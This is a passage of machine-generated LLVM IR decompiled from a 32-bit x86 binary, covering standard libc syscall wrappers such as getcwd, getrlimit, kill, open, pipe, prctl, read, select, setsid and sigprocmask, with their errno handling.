  uselistorder i32 %v1_804d7d9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d7f0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_804d7f8 = load i32, i32* @ebp, align 4
  %v0_804d7f9 = load i32, i32* @edi, align 4
  %v0_804d7fa = load i32, i32* @esi, align 4
  %v0_804d7fb = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d807 = icmp eq i32 %arg2, 0
  %v1_804d809 = icmp eq i1 %v1_804d807, false
  br i1 %v1_804d809, label %dec_label_pc_804d834, label %dec_label_pc_804d80b

dec_label_pc_804d80b:                             ; preds = %entry
  %v1_804d80b = icmp eq i32 %arg1, 0
  br i1 %v1_804d80b, label %dec_label_pc_804d81f, label %dec_label_pc_804d80f

dec_label_pc_804d80f:                             ; preds = %dec_label_pc_804d80b
  %v1_804d80f = call i32 @__errno_location(i32 %v0_804d7fb)
  %v1_804d814 = inttoptr i32 %v1_804d80f to i32*
  store i32 22, i32* %v1_804d814, align 4
  br label %dec_label_pc_804d8a5

dec_label_pc_804d81f:                             ; preds = %dec_label_pc_804d80b
  %v3_804d81f = call i32 @__GI_getpagesize(i32 %v0_804d7fb, i32 %v0_804d7fa, i32 %v0_804d7f9)
  store i32 %v3_804d81f, i32* @ebx, align 4
  %v5_804d82b = icmp slt i32 %v3_804d81f, 4096
  br i1 %v5_804d82b, label %dec_label_pc_804d82d, label %dec_label_pc_804d83c

dec_label_pc_804d82d:                             ; preds = %dec_label_pc_804d81f
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_804d83c

dec_label_pc_804d834:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804d838 = icmp eq i32 %arg1, 0
  %v1_804d83a = icmp eq i1 %v1_804d838, false
  br i1 %v1_804d83a, label %dec_label_pc_804d84e, label %dec_label_pc_804d83c

dec_label_pc_804d83c:                             ; preds = %dec_label_pc_804d81f, %dec_label_pc_804d834, %dec_label_pc_804d82d
  %v0_804d83f = phi i32 [ %v3_804d81f, %dec_label_pc_804d81f ], [ %arg2, %dec_label_pc_804d834 ], [ 4096, %dec_label_pc_804d82d ]
  store i32 %v0_804d83f, i32* %stack_var_-44, align 4
  %v1_804d840 = call i32 @malloc(i32 %v0_804d83f)
  store i32 %v1_804d840, i32* @esi, align 4
  %v1_804d84a = icmp eq i32 %v1_804d840, 0
  br i1 %v1_804d84a, label %dec_label_pc_804d8a5, label %dec_label_pc_804d83c.dec_label_pc_804d84e_crit_edge

dec_label_pc_804d83c.dec_label_pc_804d84e_crit_edge: ; preds = %dec_label_pc_804d83c
  %v0_804d859.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804d84e

dec_label_pc_804d84e:                             ; preds = %dec_label_pc_804d83c.dec_label_pc_804d84e_crit_edge, %dec_label_pc_804d834
  %v0_804d859 = phi i32 [ %v0_804d859.pre, %dec_label_pc_804d83c.dec_label_pc_804d84e_crit_edge ], [ %tmp11, %dec_label_pc_804d834 ]
  %v0_804d84e = phi i32 [ %v1_804d840, %dec_label_pc_804d83c.dec_label_pc_804d84e_crit_edge ], [ %arg1, %dec_label_pc_804d834 ]
  store i32 %v0_804d84e, i32* @ebx, align 4
  %v2_804d859 = call i32 @getcwd(i32 %v0_804d859, i32 %tmp12)
  %v0_804d85b = load i32, i32* @ebx, align 4
  store i32 %v0_804d85b, i32* @edx, align 4
  store i32 %v2_804d859, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_804d859, -4095
  br i1 %tmp18, label %dec_label_pc_804d871, label %dec_label_pc_804d866

dec_label_pc_804d866:                             ; preds = %dec_label_pc_804d84e
  %v0_804d866 = load i32, i32* %stack_var_-44, align 4
  %v1_804d866 = call i32 @__errno_location(i32 %v0_804d866)
  %v0_804d86b = load i32, i32* @ebx, align 4
  %v1_804d86b = sub i32 0, %v0_804d86b
  store i32 %v1_804d86b, i32* @ebx, align 4
  %v2_804d86d = inttoptr i32 %v1_804d866 to i32*
  store i32 %v1_804d86b, i32* %v2_804d86d, align 4
  br label %dec_label_pc_804d893

dec_label_pc_804d871:                             ; preds = %dec_label_pc_804d84e
  %v2_804d871 = icmp slt i32 %v2_804d859, 0
  br i1 %v2_804d871, label %dec_label_pc_804d893, label %dec_label_pc_804d875

dec_label_pc_804d875:                             ; preds = %dec_label_pc_804d871
  %v0_804d875 = load i32, i32* @edi, align 4
  %v1_804d875 = icmp eq i32 %v0_804d875, 0
  %v1_804d877 = icmp eq i1 %v1_804d875, false
  br i1 %v1_804d877, label %dec_label_pc_804d8a7, label %dec_label_pc_804d879

dec_label_pc_804d879:                             ; preds = %dec_label_pc_804d875
  br i1 %v1_804d809, label %dec_label_pc_804d88f, label %dec_label_pc_804d87d

dec_label_pc_804d87d:                             ; preds = %dec_label_pc_804d879
  %v0_804d880 = load i32, i32* @esi, align 4
  store i32 %v0_804d880, i32* %stack_var_-44, align 4
  %v4_804d881 = inttoptr i32 %v0_804d880 to i32*
  %v5_804d881 = call i32 @realloc(i32* %v4_804d881, i32 %v2_804d859, i32 %v0_804d85b, i32 %v0_804d85b)
  %v1_804d88b = icmp eq i32 %v5_804d881, 0
  %v1_804d88d = icmp eq i1 %v1_804d88b, false
  br i1 %v1_804d88d, label %dec_label_pc_804d8a7, label %dec_label_pc_804d88f

dec_label_pc_804d88f:                             ; preds = %dec_label_pc_804d87d, %dec_label_pc_804d879
  %v0_804d88f = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d8a7

dec_label_pc_804d893:                             ; preds = %dec_label_pc_804d871, %dec_label_pc_804d866
  %v0_804d893 = load i32, i32* @edi, align 4
  %v1_804d893 = icmp eq i32 %v0_804d893, 0
  %v1_804d895 = icmp eq i1 %v1_804d893, false
  br i1 %v1_804d895, label %dec_label_pc_804d8a5, label %dec_label_pc_804d897

dec_label_pc_804d897:                             ; preds = %dec_label_pc_804d893
  %v0_804d89a = load i32, i32* @esi, align 4
  store i32 %v0_804d89a, i32* %stack_var_-44, align 4
  %v1_804d89b = call i32 @free(i32 %v0_804d89a)
  %v0_804d8aa.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d8a7

dec_label_pc_804d8a5:                             ; preds = %dec_label_pc_804d893, %dec_label_pc_804d83c, %dec_label_pc_804d80f
  br label %dec_label_pc_804d8a7

dec_label_pc_804d8a7:                             ; preds = %dec_label_pc_804d87d, %dec_label_pc_804d875, %dec_label_pc_804d897, %dec_label_pc_804d88f, %dec_label_pc_804d8a5
  %v0_804d8aa = phi i32 [ %v5_804d881, %dec_label_pc_804d87d ], [ %v0_804d875, %dec_label_pc_804d875 ], [ %v0_804d8aa.pre, %dec_label_pc_804d897 ], [ %v0_804d88f, %dec_label_pc_804d88f ], [ 0, %dec_label_pc_804d8a5 ]
  store i32 %v0_804d7fb, i32* @ebx, align 4
  store i32 %v0_804d7fa, i32* @esi, align 4
  store i32 %v0_804d7f9, i32* @edi, align 4
  store i32 %v0_804d7f8, i32* @ebp, align 4
  ret i32 %v0_804d8aa

; uselistorder directives
  uselistorder i32 %v2_804d859, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804d840, { 0, 2, 1 }
  uselistorder i32 %v0_804d83f, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_804d8a7, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804d83c, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d8b7 = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d8be = call i32 @getrlimit(i32 7, i32 %v2_804d8b7)
  store i32 256, i32* @edx, align 4
  %v2_804d8cb = icmp slt i32 %v2_804d8be, 0
  br i1 %v2_804d8cb, label %dec_label_pc_804d8d3, label %dec_label_pc_804d8cf

dec_label_pc_804d8cf:                             ; preds = %entry
  %v3_804d8cf = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804d8cf, i32* @edx, align 4
  br label %dec_label_pc_804d8d3

dec_label_pc_804d8d3:                             ; preds = %entry, %dec_label_pc_804d8cf
  %v0_804d8d3 = phi i32 [ 256, %entry ], [ %v3_804d8cf, %dec_label_pc_804d8cf ]
  ret i32 %v0_804d8d3

; uselistorder directives
  uselistorder label %dec_label_pc_804d8d3, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804d8dc = load i32, i32* @global_var_80603b0.188, align 16
  %v1_804d8e6 = icmp eq i32 %v0_804d8dc, 0
  br i1 %v1_804d8e6, label %dec_label_pc_804d8ec, label %dec_label_pc_804d8ea

dec_label_pc_804d8ea:                             ; preds = %entry
  br label %dec_label_pc_804d8ec

dec_label_pc_804d8ec:                             ; preds = %entry, %dec_label_pc_804d8ea
  %storemerge = phi i32 [ %v0_804d8dc, %dec_label_pc_804d8ea ], [ 4096, %entry ]
  %v0_804d8ec = phi i32 [ %v0_804d8dc, %dec_label_pc_804d8ea ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804d8ec

; uselistorder directives
  uselistorder label %dec_label_pc_804d8ec, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d8f0 = load i32, i32* @ebx, align 4
  store i32 %v0_804d8f0, i32* %stack_var_-4, align 4
  %v1_804d8f9 = call i32 @getpid(i32 %v0_804d8f0)
  store i32 %v1_804d8f9, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d8f9, -4095
  br i1 %tmp6, label %dec_label_pc_804d910, label %dec_label_pc_804d904

dec_label_pc_804d904:                             ; preds = %entry
  %v0_804d904 = load i32, i32* %stack_var_-4, align 4
  %v1_804d904 = call i32 @__errno_location(i32 %v0_804d904)
  %v0_804d909 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d909 = sub i32 0, %v0_804d909
  %v2_804d90b = inttoptr i32 %v1_804d904 to i32*
  store i32 %v1_804d909, i32* %v2_804d90b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d910

dec_label_pc_804d910:                             ; preds = %entry, %dec_label_pc_804d904
  %v0_804d910 = phi i32 [ %v1_804d8f9, %entry ], [ -1, %dec_label_pc_804d904 ]
  %v2_804d914 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d914, i32* @ebx, align 4
  ret i32 %v0_804d910

; uselistorder directives
  uselistorder i32 %v1_804d8f9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d910, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d918 = load i32, i32* @ebx, align 4
  store i32 %v0_804d918, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804d92b = call i32 @int80_syscall(i32 191)
  store i32 %v1_804d92b, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d92b, -4095
  br i1 %tmp8, label %dec_label_pc_804d944, label %dec_label_pc_804d938

dec_label_pc_804d938:                             ; preds = %entry
  %v0_804d938 = load i32, i32* %stack_var_-4, align 4
  %v1_804d938 = call i32 @__errno_location(i32 %v0_804d938)
  %v0_804d93d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d93d = sub i32 0, %v0_804d93d
  %v2_804d93f = inttoptr i32 %v1_804d938 to i32*
  store i32 %v1_804d93d, i32* %v2_804d93f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d944

dec_label_pc_804d944:                             ; preds = %entry, %dec_label_pc_804d938
  %v0_804d944 = phi i32 [ %v1_804d92b, %entry ], [ -1, %dec_label_pc_804d938 ]
  %v2_804d948 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d948, i32* @ebx, align 4
  ret i32 %v0_804d944

; uselistorder directives
  uselistorder i32 %v1_804d92b, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d944, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d94c = load i32, i32* @edi, align 4
  store i32 %v0_804d94c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d964 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_804d96c = call i32 @ioctl(i32 %v0_804d964, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_804d964, i32* @ebx, align 4
  store i32 %v3_804d96c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_804d96c, -4095
  br i1 %tmp11, label %dec_label_pc_804d984, label %dec_label_pc_804d978

dec_label_pc_804d978:                             ; preds = %entry
  %v1_804d978 = call i32 @__errno_location(i32 %v0_804d964)
  %v0_804d97d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d97d = sub i32 0, %v0_804d97d
  %v2_804d97f = inttoptr i32 %v1_804d978 to i32*
  store i32 %v1_804d97d, i32* %v2_804d97f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d984

dec_label_pc_804d984:                             ; preds = %entry, %dec_label_pc_804d978
  %v0_804d984 = phi i32 [ %v3_804d96c, %entry ], [ -1, %dec_label_pc_804d978 ]
  %v2_804d989 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d989, i32* @edi, align 4
  ret i32 %v0_804d984

; uselistorder directives
  uselistorder i32 %v3_804d96c, { 1, 0, 2 }
  uselistorder i32 %v0_804d964, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d984, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d98c = load i32, i32* @ebx, align 4
  store i32 %v0_804d98c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d99f = call i32 @kill(i32 %v0_804d98c, i32 %tmp4)
  store i32 %v2_804d99f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d99f, -4095
  br i1 %tmp8, label %dec_label_pc_804d9b8, label %dec_label_pc_804d9ac

dec_label_pc_804d9ac:                             ; preds = %entry
  %v0_804d9ac = load i32, i32* %stack_var_-4, align 4
  %v1_804d9ac = call i32 @__errno_location(i32 %v0_804d9ac)
  %v0_804d9b1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d9b1 = sub i32 0, %v0_804d9b1
  %v2_804d9b3 = inttoptr i32 %v1_804d9ac to i32*
  store i32 %v1_804d9b1, i32* %v2_804d9b3, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d9b8

dec_label_pc_804d9b8:                             ; preds = %entry, %dec_label_pc_804d9ac
  %v0_804d9b8 = phi i32 [ %v2_804d99f, %entry ], [ -1, %dec_label_pc_804d9ac ]
  %v2_804d9ba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d9ba, i32* @edx, align 4
  %v2_804d9bc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d9bc, i32* @ebx, align 4
  ret i32 %v0_804d9b8

; uselistorder directives
  uselistorder i32 %v2_804d99f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d9b8, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_804d9c1 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_804d9c7 = sdiv i32 %sext, 16777216
  store i32 %v4_804d9c7, i32* @ecx, align 4
  %v4_804d9cb = ptrtoint i8* %arg1 to i32
  %v3_804d9cf = and i32 %arg2, 64
  %v4_804d9cf = icmp eq i32 %v3_804d9cf, 0
  br i1 %v4_804d9cf, label %dec_label_pc_804d9e0, label %dec_label_pc_804d9d4

dec_label_pc_804d9d4:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_804d9e0

dec_label_pc_804d9e0:                             ; preds = %entry, %dec_label_pc_804d9d4
  %v0_804d9e0 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_804d9d4 ]
  store i32 %v0_804d9e0, i32* @edx, align 4
  store i32 %v4_804d9cb, i32* %ebx.global-to-local, align 4
  %v5_804d9eb = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_804d9c7)
  store i32 %v5_804d9eb, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_804d9eb, -4095
  br i1 %tmp15, label %dec_label_pc_804da03, label %dec_label_pc_804d9f7

dec_label_pc_804d9f7:                             ; preds = %dec_label_pc_804d9e0
  %v1_804d9f7 = call i32 @__errno_location(i32 %v0_804d9c1)
  %v0_804d9fc = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d9fc = sub i32 0, %v0_804d9fc
  %v2_804d9fe = inttoptr i32 %v1_804d9f7 to i32*
  store i32 %v1_804d9fc, i32* %v2_804d9fe, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804da03

dec_label_pc_804da03:                             ; preds = %dec_label_pc_804d9e0, %dec_label_pc_804d9f7
  %v0_804da03 = phi i32 [ %v5_804d9eb, %dec_label_pc_804d9e0 ], [ -1, %dec_label_pc_804d9f7 ]
  store i32 %v0_804d9c1, i32* @ebx, align 4
  ret i32 %v0_804da03

; uselistorder directives
  uselistorder i32 %v5_804d9eb, { 1, 0, 2 }
  uselistorder i32 %v4_804d9c7, { 1, 0 }
  uselistorder i32 %v0_804d9c1, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804da03, { 1, 0 }
  uselistorder label %dec_label_pc_804d9e0, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_804da1b = inttoptr i32 %arg1 to i8*
  %v4_804da1b = call i32 @__libc_open(i8* %v3_804da1b, i32 577)
  ret i32 %v4_804da1b
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da24 = load i32, i32* @edi, align 4
  store i32 %v0_804da24, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804da2c = load i32, i32* @ebx, align 4
  %v1_804da34 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_804da34 = call i32 @pipe([2 x i32] %v1_804da34)
  store i32 %v0_804da2c, i32* @ebx, align 4
  store i32 %v2_804da34, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804da34, -4095
  br i1 %tmp8, label %dec_label_pc_804da4c, label %dec_label_pc_804da40

dec_label_pc_804da40:                             ; preds = %entry
  %v1_804da40 = call i32 @__errno_location(i32 %v0_804da2c)
  %v0_804da45 = load i32, i32* %edi.global-to-local, align 4
  %v1_804da45 = sub i32 0, %v0_804da45
  %v2_804da47 = inttoptr i32 %v1_804da40 to i32*
  store i32 %v1_804da45, i32* %v2_804da47, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804da4c

dec_label_pc_804da4c:                             ; preds = %entry, %dec_label_pc_804da40
  %v0_804da4c = phi i32 [ %v2_804da34, %entry ], [ -1, %dec_label_pc_804da40 ]
  %v2_804da50 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804da50, i32* @edi, align 4
  ret i32 %v0_804da4c

; uselistorder directives
  uselistorder i32 %v2_804da34, { 1, 0, 2 }
  uselistorder i32 %v0_804da2c, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804da4c, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804da54 = load i32, i32* @edi, align 4
  %v0_804da55 = load i32, i32* @esi, align 4
  store i32 %v0_804da55, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_804da6d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_804da75 = call i32 @prctl(i32 %v0_804da6d, i32 %v0_804da55, i32 %v0_804da54, i32 %tmp6, i32 %arg1)
  store i32 %v0_804da6d, i32* @ebx, align 4
  store i32 %v5_804da75, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_804da75, -4095
  br i1 %tmp11, label %dec_label_pc_804da8d, label %dec_label_pc_804da81

dec_label_pc_804da81:                             ; preds = %entry
  %v1_804da81 = call i32 @__errno_location(i32 %v0_804da6d)
  %v0_804da86 = load i32, i32* %esi.global-to-local, align 4
  %v1_804da86 = sub i32 0, %v0_804da86
  %v2_804da88 = inttoptr i32 %v1_804da81 to i32*
  store i32 %v1_804da86, i32* %v2_804da88, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804da8d

dec_label_pc_804da8d:                             ; preds = %entry, %dec_label_pc_804da81
  %v0_804da8d = phi i32 [ %v5_804da75, %entry ], [ -1, %dec_label_pc_804da81 ]
  %v2_804da90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804da90, i32* @esi, align 4
  store i32 %v0_804da54, i32* @edi, align 4
  ret i32 %v0_804da8d

; uselistorder directives
  uselistorder i32 %v5_804da75, { 1, 0, 2 }
  uselistorder i32 %v0_804da6d, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804da8d, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804da94 = load i32, i32* @edi, align 4
  store i32 %v0_804da94, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804daa4 = load i32, i32* @ebx, align 4
  %v4_804daac = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804daa4, i32* @ebx, align 4
  store i32 %v4_804daac, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_804daac, -4095
  br i1 %tmp11, label %dec_label_pc_804dac4, label %dec_label_pc_804dab8

dec_label_pc_804dab8:                             ; preds = %entry
  %v1_804dab8 = call i32 @__errno_location(i32 %v0_804daa4)
  %v0_804dabd = load i32, i32* %edi.global-to-local, align 4
  %v1_804dabd = sub i32 0, %v0_804dabd
  %v2_804dabf = inttoptr i32 %v1_804dab8 to i32*
  store i32 %v1_804dabd, i32* %v2_804dabf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804dac4

dec_label_pc_804dac4:                             ; preds = %entry, %dec_label_pc_804dab8
  %v0_804dac4 = phi i32 [ %v4_804daac, %entry ], [ -1, %dec_label_pc_804dab8 ]
  %v2_804dac8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804dac8, i32* @edi, align 4
  ret i32 %v0_804dac4

; uselistorder directives
  uselistorder i32 %v4_804daac, { 1, 0, 2 }
  uselistorder i32 %v0_804daa4, { 1, 0 }
  uselistorder label %dec_label_pc_804dac4, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804dacd = load i32, i32* @esi, align 4
  store i32 %v0_804dacd, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804dae5 = load i32, i32* @ebx, align 4
  %v1_804daed = call i32 @int80_syscall(i32 142)
  store i32 %v0_804dae5, i32* @ebx, align 4
  store i32 %v1_804daed, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804daed, -4095
  br i1 %tmp11, label %dec_label_pc_804db05, label %dec_label_pc_804daf9

dec_label_pc_804daf9:                             ; preds = %entry
  %v1_804daf9 = call i32 @__errno_location(i32 %v0_804dae5)
  %v0_804dafe = load i32, i32* %esi.global-to-local, align 4
  %v1_804dafe = sub i32 0, %v0_804dafe
  %v2_804db00 = inttoptr i32 %v1_804daf9 to i32*
  store i32 %v1_804dafe, i32* %v2_804db00, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804db05

dec_label_pc_804db05:                             ; preds = %entry, %dec_label_pc_804daf9
  %v0_804db05 = phi i32 [ %v1_804daed, %entry ], [ -1, %dec_label_pc_804daf9 ]
  %v2_804db07 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804db07, i32* @edx, align 4
  %v2_804db08 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804db08, i32* @esi, align 4
  ret i32 %v0_804db05

; uselistorder directives
  uselistorder i32 %v1_804daed, { 1, 0, 2 }
  uselistorder i32 %v0_804dae5, { 1, 0 }
  uselistorder label %dec_label_pc_804db05, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804db0c = load i32, i32* @ebx, align 4
  store i32 %v0_804db0c, i32* %stack_var_-4, align 4
  %v1_804db15 = call i32 @setsid(i32 %v0_804db0c)
  store i32 %v1_804db15, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804db15, -4095
  br i1 %tmp6, label %dec_label_pc_804db2c, label %dec_label_pc_804db20

dec_label_pc_804db20:                             ; preds = %entry
  %v0_804db20 = load i32, i32* %stack_var_-4, align 4
  %v1_804db20 = call i32 @__errno_location(i32 %v0_804db20)
  %v0_804db25 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804db25 = sub i32 0, %v0_804db25
  %v2_804db27 = inttoptr i32 %v1_804db20 to i32*
  store i32 %v1_804db25, i32* %v2_804db27, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804db2c

dec_label_pc_804db2c:                             ; preds = %entry, %dec_label_pc_804db20
  %v0_804db2c = phi i32 [ %v1_804db15, %entry ], [ -1, %dec_label_pc_804db20 ]
  %v2_804db30 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804db30, i32* @ebx, align 4
  ret i32 %v0_804db2c

; uselistorder directives
  uselistorder i32 %v1_804db15, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804db2c, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_804db35 = load i32, i32* @esi, align 4
  %v4_804db39 = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_804db39, i32* @ecx, align 4
  %v2_804db45 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_804db45, label %dec_label_pc_804db5e, label %dec_label_pc_804db49

dec_label_pc_804db49:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_804db5e, label %dec_label_pc_804db4e

dec_label_pc_804db4e:                             ; preds = %dec_label_pc_804db49
  %v1_804db4e = call i32 @__errno_location(i32 %v0_804db35)
  %v1_804db53 = inttoptr i32 %v1_804db4e to i32*
  store i32 22, i32* %v1_804db53, align 4
  br label %dec_label_pc_804db85

dec_label_pc_804db5e:                             ; preds = %dec_label_pc_804db49, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_804db63 = load i32, i32* @ebx, align 4
  %v7_804db6b = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_804db63, i32* @ebx, align 4
  store i32 %v7_804db6b, i32* %esi.global-to-local, align 4
